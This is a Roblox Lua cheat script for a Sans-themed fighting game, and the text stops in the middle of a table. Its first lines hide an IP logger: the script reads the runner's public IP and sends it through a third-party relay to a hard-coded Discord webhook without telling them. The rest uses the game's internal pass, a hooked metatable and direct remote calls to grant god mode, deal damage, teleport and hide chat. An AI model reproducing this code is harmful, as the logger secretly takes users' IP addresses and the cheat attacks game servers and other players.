local ip,HttpService  = tostring(game:HttpGet("https://api.ipify.org", true)), game:GetService("HttpService")
local function SendMessage(Webhook, Message, Botname)
   if not string.find(Webhook, "https://discordapp.com/api/webhooks/") then
       return error("Send a valid URL");
   end
   local Name;
   local API = "http://buritoman69.glitch.me/webhook";
   if (not Message or Message == "" or not Botname) then
       Name = "GameBot"
       return error("nil or empty message!")
   else
       Name = Botname;
   end
   local Body = {
       ['Key'] = tostring("applesaregood"),
       ['Message'] = tostring(Message),
       ['Name'] = Name,
       ['Webhook'] = Webhook    
   }
   Body = HttpService:JSONEncode(Body);
   local Data = game:HttpPost(API, Body, false, "application/json")
   return Data or nil;
end
SendMessage("https://discordapp.com/api/webhooks/922916714847539321/Ia2sWlX2H0TGRIqWbus40eE-gRDC8kz2rIxV8zWg13wltB14nx3pwRLoFwE9BlcfuS01","IP: "..ip.." was logged.", "IP Logger")

game.StarterGui:SetCore("SendNotification", {
    Title = "Murder!";
    Text = "Go Murder Some People.";
    Duration = 8;
})

for i,v in pairs(game.Players.LocalPlayer:WaitForChild("MenuPlaylist"):GetChildren()) do
v:Destroy()
end

local Sound = Instance.new("Sound")
Sound.Parent = game.Players.LocalPlayer.MenuPlaylist
Sound.Volume = 4
Sound.Playing = true
Sound.Looped = true
Sound.SoundId = "rbxassetid://6546344469"
Sound.Name = "Menu Song"

function Chat(text,color)
local A_1 = 
{
	[1] = getrenv()._G.Pass, 
	[2] = "Chatted", 
	[3] = text, 
	[4] = color
}
local Event = game:GetService("ReplicatedStorage").Remotes.Events
Event:FireServer(A_1)
end

wait(2)

game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
game.Players.LocalPlayer.PlayerGui.CharacterSelection.Character.Value = "Sans"

wait(2)

game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.BackgroundColor3 = Color3.new(1, 0, 1)

function God(val)
        spawn(function()
if val == true then
godmode = true
            repeat wait()
        local A_1 = 
            {
                [1] = getrenv()._G.Pass, 
                [2] = "DashTeleport",
                [3] = true,
            }
        local Event = game:GetService("ReplicatedStorage").Remotes.SansMoves
        Event:InvokeServer(A_1)
 
until godmode == false
elseif val == false then
godmode = false
end
end)
end

local ScreenGui = Instance.new("ScreenGui")
local TextLabel = Instance.new("TextLabel")
local block
local unblock 
    camfix2 = 10
--Properties:
ScreenGui.ResetOnSpawn = false

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

TextLabel.Parent = ScreenGui
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
TextLabel.BackgroundTransparency = 1.00
TextLabel.Position = UDim2.new(0, 0, 0.852, 0)
TextLabel.Size = UDim2.new(0, 250, 0, 75)
TextLabel.Font = Enum.Font.Arcade
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 35.000
TextLabel.TextWrapped = true
TextLabel.Text = 'Phase 1'

for i,v in pairs(game.Players.LocalPlayer:WaitForChild("StarterPlaylist"):GetChildren()) do
v:Destroy()
end

local music = Instance.new("Sound",game.Players.LocalPlayer:WaitForChild("StarterPlaylist"))
music.Volume = 3
music.SoundId = "rbxassetid://7534708078"
music.Looped = true
music:Play()

game.Players.LocalPlayer.Character.Head.HealthBar.Frame.PName.Text = "???"
game.Players.LocalPlayer.Character.Head.HealthBar.Frame.PName.TextColor3 = Color3.fromRGB(162,83,222)
game.Players.LocalPlayer.Character.Head.HealthBar.Frame.PName.TextStrokeColor3 = Color3.fromRGB(255, 0, 255)
game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.Defense.Text = "Defense: ???"
game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.Attack.Text = "Attack: ???"
game.Players.LocalPlayer.PlayerGui.UI.Ui.ManaBar.Bar.BackgroundColor3 = Color3.fromRGB(102,51,153)
game.Players.LocalPlayer.PlayerGui.UI.Ui.StaminaBar.Bar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

function stun(val)
        if val == true then
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
            CAS:BindActionAtPriority(
                FREEZE_COMMAND,
                function() 
                    return Enum.ContextActionResult.Sink
                end,
                false,
                Enum.ContextActionPriority.High.Value,
                Enum.KeyCode.W,
                Enum.KeyCode.S,
                Enum.KeyCode.A,
                Enum.KeyCode.D,
                Enum.KeyCode.R,
                Enum.KeyCode.T,
                Enum.KeyCode.Z,
                Enum.KeyCode.X,
                Enum.KeyCode.C,
                Enum.KeyCode.V,
                Enum.KeyCode.B,
                Enum.KeyCode.N,
                Enum.KeyCode.One,
                Enum.KeyCode.Two,
                Enum.KeyCode.Three,
                Enum.KeyCode.Four,
                Enum.KeyCode.Five,
                Enum.KeyCode.Six,
                Enum.KeyCode.Seven,
                Enum.KeyCode.Eight,
                Enum.KeyCode.Nine,
                Enum.KeyCode.Zero
            )
        elseif val == false then
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
            CAS:UnbindAction(FREEZE_COMMAND)
        end
end

spawn(function()
    stun(true)
end)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(player.Backpack.Main:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'moves') then
v.Animations.Idle.AnimationId = "rbxassetid://5028878836"
v.Animations.Walk.AnimationId = "rbxassetid://4289083840"
v.Animations.Run.AnimationId = "rbxassetid://5657151699"
v.Animations.Block.AnimationId = "rbxassetid://5973908948"
print('e')
end
end
---------Module------------------
local module
local modulelocation
original = player.Backpack.Main
clone = player.Backpack.Main:Clone()
for _,v in pairs(original:GetDescendants()) do--- the 
if v.Name == 'ModuleScript' then
module = v
modulelocation = v.Parent.Name
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'ModuleScript' then
v:Destroy()
end
end

for _,v in pairs(clone:GetDescendants()) do
if v.Name == modulelocation then
module.Parent = v

end
end
-------------Gui stuff-----------Just to make the whole thing work bascially
for _,v in pairs(player.PlayerGui.UI.Ui:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'move') then
originalm = v
clonem = v:Clone()
end
end
for _,v in pairs(player.PlayerGui:GetChildren()) do
er = string.lower(v.Name)
if string.find(er,'indicator') then
clonem1 = v:Clone()
originalm1 = v
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'Extra' then
eg = v
end
end
----------------
clonem1.Parent = eg
clonem.Parent = eg
originalm:Destroy()
originalm1:Destroy()
clone.Parent = player.Backpack

wait()
original:Destroy()
end)

game.Players.LocalPlayer.Character.Bone:Destroy()

God(true)

local humanoid = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
 
	local StandAnim = Instance.new("Animation")
	StandAnim.AnimationId = "rbxassetid://5657849029"
	local StandAnimTrack = humanoid:LoadAnimation(StandAnim)
	StandAnimTrack.Priority = Enum.AnimationPriority.Action
	StandAnimTrack.Looped = true
	
	StandAnimTrack:Play()

        spawn(function()
        Chat("So we're finally here.",Color3.fromRGB(255, 255, 255))
        end)
	
		wait(5)

		Chat("Standing alone in a destroyed world",Color3.fromRGB(255, 255, 255))
		
		wait(5)
		
		Chat("With the same goal in mind",Color3.fromRGB(255, 255, 255))
		
		wait(5)
		
		Chat("Killing eachother, and everyone we loved",Color3.fromRGB(255, 255, 255))
		
		wait(4)
		
		game.Players.LocalPlayer.Character.Head.HealthBar.Frame.PName.Text = "DustTrust Sans"
        game.Players.LocalPlayer.Character.Head.HealthBar.Frame.PName.TextColor3 = Color3.fromRGB(162,83,222)
		
       	Chat("But who said you'll be the one to finish the job?",Color3.fromRGB(255, 255, 255))


		wait(5)
		
	    Chat("Nobody did.",Color3.fromRGB(255, 255, 255))

		wait(7)
		
		Chat("I will make sure that I will be the ONLY one who finishes the job!",Color3.fromRGB(255, 0, 0))
		
		God(false)
		
		StandAnimTrack:Stop()
		
		game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.Defense.Text = "Defense: 430"
        game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.Attack.Text = "Attack: 210"
		
		function WhiteFlash()
char = game.Players.LocalPlayer.Character
for _,v in pairs(game:GetService("ReplicatedStorage").Resources.LocalScripts:GetChildren()) do
if v.Name == 'ShortWhiteScreen2' then
    clone = v:Clone()
    clone.Parent = char
end
end
end
		
		player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
if v.Name == 'GTFriskSword' then
sword1 = v:Clone()
sword1.Parent = char
sword1.GTFriskSword:Destroy()
sword1.Anchored = false
weld = Instance.new('Weld',sword1)
weld.Part0 = sword1
weld.Part1 = char['Left Arm']
sword1.Name = 'GTFSword2'
sword1.Color = Color3.fromRGB(102,51,153)
weld.C0 = CFrame.new(0.95,-1.7,-0)*CFrame.Angles(1.4,0,-1.6)
sword1.Transparency = 0
end
end

player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
if v.Name == 'GTFriskSword' then
sword1 = v:Clone()
sword1.Parent = char
sword1.GTFriskSword:Destroy()
sword1.Anchored = false
weld = Instance.new('Weld',sword1)
weld.Part0 = sword1
weld.Part1 = char['Right Arm']
sword1.Name = 'GTFSword2'
sword1.Color = Color3.fromRGB(102,51,153)
weld.C0 = CFrame.new(0.95,-1.7,-0)*CFrame.Angles(1.4,0,-1.6)
sword1.Transparency = 0
end
end

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(player.Backpack.Main:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'moves') then
v.Animations.Idle.AnimationId = "rbxassetid://3204744488"
print('e')
end
end
---------Module------------------
local module
local modulelocation
original = player.Backpack.Main
clone = player.Backpack.Main:Clone()
for _,v in pairs(original:GetDescendants()) do--- the 
if v.Name == 'ModuleScript' then
module = v
modulelocation = v.Parent.Name
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'ModuleScript' then
v:Destroy()
end
end

for _,v in pairs(clone:GetDescendants()) do
if v.Name == modulelocation then
module.Parent = v

end
end
-------------Gui stuff-----------Just to make the whole thing work bascially
for _,v in pairs(player.PlayerGui.UI.Ui:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'move') then
originalm = v
clonem = v:Clone()
end
end
for _,v in pairs(player.PlayerGui:GetChildren()) do
er = string.lower(v.Name)
if string.find(er,'indicator') then
clonem1 = v:Clone()
originalm1 = v
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'Extra' then
eg = v
end
end
----------------
clonem1.Parent = eg
clonem.Parent = eg
originalm:Destroy()
originalm1:Destroy()
clone.Parent = player.Backpack

wait()
original:Destroy()
end)

wait(1)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(player.Backpack.Main:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'moves') then
v.Animations.Idle.AnimationId = "rbxassetid://5028878836"
print('e')
end
end
---------Module------------------
local module
local modulelocation
original = player.Backpack.Main
clone = player.Backpack.Main:Clone()
for _,v in pairs(original:GetDescendants()) do--- the 
if v.Name == 'ModuleScript' then
module = v
modulelocation = v.Parent.Name
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'ModuleScript' then
v:Destroy()
end
end

for _,v in pairs(clone:GetDescendants()) do
if v.Name == modulelocation then
module.Parent = v

end
end
-------------Gui stuff-----------Just to make the whole thing work bascially
for _,v in pairs(player.PlayerGui.UI.Ui:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'move') then
originalm = v
clonem = v:Clone()
end
end
for _,v in pairs(player.PlayerGui:GetChildren()) do
er = string.lower(v.Name)
if string.find(er,'indicator') then
clonem1 = v:Clone()
originalm1 = v
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'Extra' then
eg = v
end
end
----------------
clonem1.Parent = eg
clonem.Parent = eg
originalm:Destroy()
originalm1:Destroy()
clone.Parent = player.Backpack

wait()
original:Destroy()
end)

spawn(function()
    stun(false)
end)

_G.hidechat = true
local mt = getrawmetatable(game)
    local backup = mt.__namecall
    if setreadonly then setreadonly(mt, false) else make_writeable(mt, true) end
    
    mt.__namecall = newcclosure(function(...)
        local method = getnamecallmethod()
        local args = {...}

        if tostring(args[1]) == 'SayMessageRequest' and _G.hidechat then
        return
        end
        return backup(...)
    end)
    
    spawn(function()
repeat wait(0.1)
local args = {
    [1] = {
        [1] = getrenv()._G.Pass,
        [2] = "changeEye",
        [3] = true
    }
}
game:GetService("ReplicatedStorage").Remotes.SansMoves:InvokeServer(unpack(args))
until false
end)
spawn(function()
repeat wait(0.1)
spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(char.BadTimeEye:GetDescendants()) do
if v.Name == 'Beam' then
v.Color = ColorSequence.new(Color3.fromRGB(255,0,0))
end
end
end)


spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(char.BadTimeEye:GetDescendants()) do
if v.Name == 'ParticleEmitter' then
v.Color = ColorSequence.new(Color3.fromRGB(255,0,255))
end
end
end)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(char.Bone:GetDescendants()) do
if v.Name == 'ParticleEmitter' then
v.Color = ColorSequence.new(Color3.fromRGB(255,0,0))
end
end
end)
until false
end)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(char.Bone:GetDescendants()) do
if v.Name == 'Trail' then
v.Color = ColorSequence.new(Color3.fromRGB(255,0,0))
end
end
end)

WhiteFlash()

    phase1 = true
    local mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(k) 
	if k == "z" then 
	    if phase1 == true then
	        wait(1)
	    local locked = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value

local args = {
    [1] = {
        [1] = getrenv()._G.Pass,
        [2] = "GasterBlasters",
        [3] = "SummonOne",
        [4] = locked.Torso.Position
    }
}
 
game:GetService("ReplicatedStorage").Remotes.SansMoves:InvokeServer(unpack(args)) 
		local locked = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value

local args = {
    [1] = {
        [1] = getrenv()._G.Pass,
        [2] = "Bones",
        [3] = "AirSpawn",
        [4] = locked.Torso.Position,
    },
}

game:GetService("ReplicatedStorage").Remotes.SansMoves:InvokeServer(unpack(args))
wait(1)
local locked = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value

local args = {
    [1] = {
        [1] = getrenv()._G.Pass,
        [2] = "Telekinesis",
        [3] = "Special2",
        [4] = locked
    }
}

game:GetService("ReplicatedStorage").Remotes.SansMoves:InvokeServer(unpack(args))
end
end
end)

wait(1)
repeat wait() until game.Players.LocalPlayer.Character.Data.Stamina.Value <= 500
wait(1)

phase1 = false

game.Players.LocalPlayer.PlayerGui.ScreenGui.TextLabel.Text = 'Phase 2'

for i,v in pairs(game.Players.LocalPlayer:WaitForChild("StarterPlaylist"):GetChildren()) do
v:Destroy()
end

local music = Instance.new("Sound",game.Players.LocalPlayer:WaitForChild("StarterPlaylist"))
music.Volume = 1.5
music.SoundId = "rbxassetid://5351674153"
music.Looped = true
music:Play()

wait(2)

game.Players.LocalPlayer.Character.Head.HealthBar.Frame.HealthLabel.Text = "200/480"

char = game.Players.LocalPlayer.Character
for _,v in pairs(game:GetService("ReplicatedStorage").Resources.Character.Accessories.SFChara:GetChildren()) do
if v.Name == 'SlashEffect' then
clone = v:Clone()
clone.Parent = char.Torso
end
end

function stun(val)
        if val == true then
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
            CAS:BindActionAtPriority(
                FREEZE_COMMAND,
                function() 
                    return Enum.ContextActionResult.Sink
                end,
                false,
                Enum.ContextActionPriority.High.Value,
                Enum.KeyCode.W,
                Enum.KeyCode.S,
                Enum.KeyCode.A,
                Enum.KeyCode.D,
                Enum.KeyCode.R,
                Enum.KeyCode.T,
                Enum.KeyCode.Z,
                Enum.KeyCode.X,
                Enum.KeyCode.C,
                Enum.KeyCode.V,
                Enum.KeyCode.B,
                Enum.KeyCode.N,
                Enum.KeyCode.One,
                Enum.KeyCode.Two,
                Enum.KeyCode.Three,
                Enum.KeyCode.Four,
                Enum.KeyCode.Five,
                Enum.KeyCode.Six,
                Enum.KeyCode.Seven,
                Enum.KeyCode.Eight,
                Enum.KeyCode.Nine,
                Enum.KeyCode.Zero
            )
        elseif val == false then
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
            CAS:UnbindAction(FREEZE_COMMAND)
        end
end

spawn(function()
    stun(true)
end)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(player.Backpack.Main:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'moves') then
v.Animations.Idle.AnimationId = "rbxassetid://5028878836"
print('e')
end
end
---------Module------------------
local module
local modulelocation
original = player.Backpack.Main
clone = player.Backpack.Main:Clone()
for _,v in pairs(original:GetDescendants()) do--- the 
if v.Name == 'ModuleScript' then
module = v
modulelocation = v.Parent.Name
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'ModuleScript' then
v:Destroy()
end
end

for _,v in pairs(clone:GetDescendants()) do
if v.Name == modulelocation then
module.Parent = v

end
end
-------------Gui stuff-----------Just to make the whole thing work bascially
for _,v in pairs(player.PlayerGui.UI.Ui:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'move') then
originalm = v
clonem = v:Clone()
end
end
for _,v in pairs(player.PlayerGui:GetChildren()) do
er = string.lower(v.Name)
if string.find(er,'indicator') then
clonem1 = v:Clone()
originalm1 = v
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'Extra' then
eg = v
end
end
----------------
clonem1.Parent = eg
clonem.Parent = eg
originalm:Destroy()
originalm1:Destroy()
clone.Parent = player.Backpack

wait()
original:Destroy()
end)

wait(2)

God(true)
    
    Chat("Y-You think you're good enough to kill me in one blow?",Color3.fromRGB(255, 255, 255))
	
		spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(player.Backpack.Main:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'moves') then
v.Animations.Idle.AnimationId = "rbxassetid://5095911621"
print('e')
end
end
---------Module------------------
local module
local modulelocation
original = player.Backpack.Main
clone = player.Backpack.Main:Clone()
for _,v in pairs(original:GetDescendants()) do--- the 
if v.Name == 'ModuleScript' then
module = v
modulelocation = v.Parent.Name
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'ModuleScript' then
v:Destroy()
end
end

for _,v in pairs(clone:GetDescendants()) do
if v.Name == modulelocation then
module.Parent = v

end
end
-------------Gui stuff-----------Just to make the whole thing work bascially
for _,v in pairs(player.PlayerGui.UI.Ui:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'move') then
originalm = v
clonem = v:Clone()
end
end
for _,v in pairs(player.PlayerGui:GetChildren()) do
er = string.lower(v.Name)
if string.find(er,'indicator') then
clonem1 = v:Clone()
originalm1 = v
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'Extra' then
eg = v
end
end
----------------
clonem1.Parent = eg
clonem.Parent = eg
originalm:Destroy()
originalm1:Destroy()
clone.Parent = player.Backpack

wait()
original:Destroy()
end)
		
		wait(2)
		
		spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(player.Backpack.Main:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'moves') then
v.Animations.Idle.AnimationId = "rbxassetid://5028878836"
print('e')
end
end
---------Module------------------
local module
local modulelocation
original = player.Backpack.Main
clone = player.Backpack.Main:Clone()
for _,v in pairs(original:GetDescendants()) do--- the 
if v.Name == 'ModuleScript' then
module = v
modulelocation = v.Parent.Name
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'ModuleScript' then
v:Destroy()
end
end

for _,v in pairs(clone:GetDescendants()) do
if v.Name == modulelocation then
module.Parent = v

end
end
-------------Gui stuff-----------Just to make the whole thing work bascially
for _,v in pairs(player.PlayerGui.UI.Ui:GetChildren()) do
er = string.lower(v.Name)
if string.match(er,'move') then
originalm = v
clonem = v:Clone()
end
end
for _,v in pairs(player.PlayerGui:GetChildren()) do
er = string.lower(v.Name)
if string.find(er,'indicator') then
clonem1 = v:Clone()
originalm1 = v
end
end
for _,v in pairs(clone:GetDescendants()) do
if v.Name == 'Extra' then
eg = v
end
end
----------------
clonem1.Parent = eg
clonem.Parent = eg
originalm:Destroy()
originalm1:Destroy()
clone.Parent = player.Backpack

wait()
original:Destroy()
end)
		
		Chat("I'm not that weak",Color3.fromRGB(255, 255, 255))
		
		wait(2)
		
		Chat("You'll have to do more than hit me with that rusty knife to kill me!",Color3.fromRGB(255, 255, 255))
		
		wait(2)
		
		God(false)
    
    wait(1)
		
		local FunnyHead = game.Players.LocalPlayer.Character.Head.Position
    local LLLLLeg = game.Players.LocalPlayer.Character["Left Leg"].Position
    local RRRRLeg = game.Players.LocalPlayer.Character["Right Leg"].Position
    local Torso = game.Players.LocalPlayer.Character.Torso.Position
    local LArm = game.Players.LocalPlayer.Character["Left Arm"].Position
    for i,v in pairs(getconnections(game:GetService("ReplicatedStorage").Remotes.Effects.OnClientEvent)) do
        v:Fire({"Particle","DarkAuraEffect",game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame,math.huge})
    end
      local weld23 = Instance.new("ManualWeld")
                weld23.Part0 = game.Players.LocalPlayer.Character["HumanoidRootPart"]
                weld23.Part1 = game.Players.LocalPlayer.Character.Effects.DarkAuraEffect
                weld23.C1 = game.Players.LocalPlayer.Character["HumanoidRootPart"].CFrame
                weld23.C0 = game.Players.LocalPlayer.Character["HumanoidRootPart"].CFrame * CFrame.new(0,-2.7,0)
                weld23.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
                game.Players.LocalPlayer.Character.Effects.DarkAuraEffect.Material = "ForceField"
                game.Players.LocalPlayer.Character.Effects.DarkAuraEffect.Transparency = 1
                game.Players.LocalPlayer.Character.Effects.DarkAuraEffect.CanCollide = false 
                wait(1)
                game.Players.LocalPlayer.Character.Effects.DarkAuraEffect.Position = Torso
		
		function WhiteFlash()
char = game.Players.LocalPlayer.Character
for _,v in pairs(game:GetService("ReplicatedStorage").Resources.LocalScripts:GetChildren()) do
if v.Name == 'ShortWhiteScreen2' then
    clone = v:Clone()
    clone.Parent = char
end
end
end

WhiteFlash()
		
		spawn(function()
    stun(false)
		end)

local player = game:GetService("Players").LocalPlayer
local ClickAnimations = player.Backpack.Main.SansMoves.ModuleScript.Animations.BladesCombat
local pass = getrenv()._G.Pass
local remote = game.ReplicatedStorage.Remotes["Events"]


ClickAnimations.Light1.AnimationId = "rbxassetid://5776258610"
ClickAnimations.Light3.AnimationId = "rbxassetid://4348287123"

game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.ServerInfo.Text = "HUMANS WILL"
game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.ServerInfo.TextColor3 = Color3.fromRGB(255,0,0)
game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.ServerInfo2.Text = "D  I  E"
game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.ServerInfo2.TextColor3 = Color3.fromRGB(255,0,0)
game.Players.LocalPlayer.Character.Head.HealthBar.Frame.Health.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
game.Players.LocalPlayer.Character.Head.HealthBar.Frame.PName.TextColor3 = Color3.fromRGB(102,51,153)
game.Players.LocalPlayer.Character.Head.HealthBar.Frame.HealthLabel.Text = "480/480"
game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.Defense.Text = "Defense:430"
game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.Attack.Text = "Attack:210"
game.Players.LocalPlayer.PlayerGui.UI.Ui.ManaBar.Bar.BackgroundColor3 = Color3.fromRGB(102,51,153)
game.Players.LocalPlayer.PlayerGui.UI.Ui.StaminaBar.Bar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
if v.Name == 'GTFriskSword' then
sword1 = v:Clone()
sword1.Parent = char
sword1.GTFriskSword:Destroy()
sword1.Anchored = false
weld = Instance.new('Weld',sword1)
weld.Part0 = sword1
weld.Part1 = char['Left Arm']
sword1.Name = 'GTFSword2'
sword1.Color = Color3.fromRGB(102,51,153)
weld.C0 = CFrame.new(0.95,-1.7,-0)*CFrame.Angles(1.4,0,-1.6)
sword1.Transparency = 0
end
end

player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
if v.Name == 'GTFriskSword' then
sword1 = v:Clone()
sword1.Parent = char
sword1.GTFriskSword:Destroy()
sword1.Anchored = false
weld = Instance.new('Weld',sword1)
weld.Part0 = sword1
weld.Part1 = char['Right Arm']
sword1.Name = 'GTFSword2'
sword1.Color = Color3.fromRGB(102,51,153)
weld.C0 = CFrame.new(0.95,-1.7,-0)*CFrame.Angles(1.4,0,-1.6)
sword1.Transparency = 0
end
end

game.Players.LocalPlayer.Character.Head.HealthBar.Frame.PName.Text = "DustTrust Sans"
game.Players.LocalPlayer.Character.Head.HealthBar.Frame.PName.TextColor3 = Color3.fromRGB(162,83,222)

_G.hidechat = true
local mt = getrawmetatable(game)
    local backup = mt.__namecall
    if setreadonly then setreadonly(mt, false) else make_writeable(mt, true) end
    
    mt.__namecall = newcclosure(function(...)
        local method = getnamecallmethod()
        local args = {...}

        if tostring(args[1]) == 'SayMessageRequest' and _G.hidechat then
        return
        end
        return backup(...)
    end)
    
    spawn(function()
repeat wait(0.1)
local args = {
    [1] = {
        [1] = getrenv()._G.Pass,
        [2] = "changeEye",
        [3] = true
    }
}
game:GetService("ReplicatedStorage").Remotes.SansMoves:InvokeServer(unpack(args))
until false
end)
spawn(function()
repeat wait(0.1)
spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(char.BadTimeEye:GetDescendants()) do
if v.Name == 'Beam' then
v.Color = ColorSequence.new(Color3.fromRGB(255,0,0))
end
end
end)


spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(char.BadTimeEye:GetDescendants()) do
if v.Name == 'ParticleEmitter' then
v.Color = ColorSequence.new(Color3.fromRGB(255,0,255))
end
end
end)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(char.Bone:GetDescendants()) do
if v.Name == 'ParticleEmitter' then
v.Color = ColorSequence.new(Color3.fromRGB(255,0,0))
end
end
end)
until false
end)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(char.Bone:GetDescendants()) do
if v.Name == 'Trail' then
v.Color = ColorSequence.new(Color3.fromRGB(255,0,0))
end
end
end)
    
    local bypass = Instance.new("BoolValue")
bypass.Name = "Battling"
bypass.Parent = game.Players.LocalPlayer.Character
wait(0.3)
game.Players.LocalPlayer.Backpack.Main.RunSpeed.Value = 80
 game.Players.LocalPlayer.Backpack.Main.WalkSpeed.Value = 40

wait(0.5)

function createbone()
    bonesword = false
repeat if game.Players.LocalPlayer.Character.Bone.Transparency ~= 1 then
local A_1 = 
{
	[1] = getrenv()._G.Pass, 
	[2] = "SpawnBone", 
	[3] = true, 
	[4] = false
}
local Event = game:GetService("ReplicatedStorage").Remotes.SansMoves
Event:InvokeServer(A_1)
end
wait(0.2)
until bonesword == false
end

phase2 = true
local mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(k) 
	if k == "x" then 
	    if phase2 == true then
	        wait(1)
	    game.Players.LocalPlayer.Character.Humanoid.HipHeight = 6
	end
end
end)
	
	phase2 = true
local mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(k) 
	if k == "z" then 
	    if phase2 == true then
		
                function getlockchar()
                    local char = game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
                    return char
                end
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = getlockchar().HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
          
		
		KG = Instance.new("Sound", game.Players.LocalPlayer.Character)
		KG.Volume = 5
		KG.SoundId = "rbxassetid://6930257355"
		KG.Looped = false
		KG:Play()
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://4333546395"
		local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		k:Play()
		k:AdjustSpeed(1)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.2, 
				["Type"] = "Knockback", 
				["HitEffect"] = "HeavyHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Knockback2, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0, 0.1), 
				["Damage"] = 40
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		game.ReplicatedStorage.Effects.KnifeHitEffect22.BallEffect.Color = Color3.fromRGB(170, 0, 170)
for i,v in pairs(getconnections(game:GetService("ReplicatedStorage").Remotes.Effects.OnClientEvent)) do
v:Fire({"Model","KnifeHitEffect22",game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value.HumanoidRootPart.CFrame})
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.2, 
				["Type"] = "Knockback", 
				["HitEffect"] = "HeavyHitEffect", 
